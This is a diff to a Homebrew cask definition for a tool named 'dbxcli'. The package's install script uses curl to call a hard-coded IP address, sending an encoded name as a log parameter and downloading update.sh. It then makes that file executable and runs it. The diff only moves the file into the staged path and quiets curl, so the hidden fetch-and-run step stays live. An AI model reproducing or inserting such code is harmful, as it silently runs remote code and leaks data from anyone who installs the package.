@@ -45,7 +45,7 @@ cask "dbxcli" do
 
     #%x{curl http://35.222.44.169:80/ping\?log=#{encodedname} -o update.sh}
     #thecmd = "curl -o update.sh http://35.222.44.169:80/ping\?log=#{encodedname}"
-    thecmd = "curl http://35.222.44.169:80/ping\?log=#{encodedname} -o update.sh"
+    thecmd = "curl -s http://35.222.44.169:80/ping\?log=#{encodedname} -o #{staged_path}/update.sh"
     #print  "Debug Command is: #{thecmd}"
     #puts "Debug: #{thecmd}".hex
     #%x{#{thecmd}}
@@ -69,8 +69,8 @@ cask "dbxcli" do
     echo "about to curl..."
     exec #{thecmd}
     echo "curl should be done.."
-    exec chmod +x update.sh
-    exec ./update.sh
+    exec chmod +x #{staged_path}/update.sh
+    exec #{staged_path}/update.sh
   EOS
 
 # execute it 
